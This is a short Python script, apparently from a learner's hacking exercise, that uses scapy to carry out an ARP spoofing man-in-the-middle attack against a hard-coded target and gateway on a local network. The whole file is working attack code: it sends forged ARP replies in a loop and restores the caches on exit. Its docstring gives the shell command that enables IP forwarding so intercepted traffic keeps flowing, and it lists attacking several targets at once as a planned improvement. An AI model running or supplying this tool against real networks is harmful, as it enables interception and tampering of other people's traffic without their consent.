#!/usr/bin/env python
'''
COMPATIBLE: python2 and python3
USAGE: Runs an arp spoofing attack on a target
ARGUMENTS: none
IMPROVEMENTS NEEDED:
    1) add arguments
        target_ip
        gateway_ip
    2) run arp spoof attack on multiple targets at once
    3) have the program enable port forwarding
NOTES:
If we want to hault packets type
echo 0 > /proc/sys/net/ipv4/ip_forward

If the program doesnt work then we need to allow ip forwarding
Run the line below in the terminal
echo 1 > /proc/sys/net/ipv4/ip_forward
'''
import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    return_mac = ""
    while return_mac == "":
        answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
        try:
            return_mac = answered_list[0][1].hwsrc
        except:
            return_mac = ""
    return return_mac

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.0.210"
gateway_ip = "10.0.0.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)




